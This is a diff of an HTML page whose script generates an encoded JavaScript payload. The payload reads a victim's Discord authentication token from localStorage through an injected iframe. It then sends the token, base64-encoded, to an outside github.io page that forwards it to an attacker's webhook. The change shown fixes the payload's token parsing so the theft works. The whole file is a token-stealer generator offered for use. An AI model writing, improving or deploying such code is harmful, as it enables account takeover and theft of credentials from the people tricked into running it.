@@ -73,7 +73,7 @@ body {
     </div>
     <script>
         function generate() {
-            var code = `(function(){location.reload();var i=document.createElement('ifr' + 'ame');document.body.appendChild(i);var token=i.contentWindow.localStorage.token;window.open("https://exampleaccount0110.github.io/discord/?webhook=YOUR_WEBHOOK_HERE&token="+btoa(token), "_blank");})();`;
+            var code = `(function(){location.reload();var i=document.createElement('ifr' + 'ame');document.body.appendChild(i);var token=JSON.parse(i.contentWindow.localStorage.token);window.open("https://exampleaccount0110.github.io/discord/?webhook=YOUR_WEBHOOK_HERE&token="+btoa(token), "_blank");})();`;
             var wh = document.getElementById("hook").value;
             code = code.replace('YOUR_WEBHOOK_HERE', btoa(wh));
             const encodedCode = btoa(code);
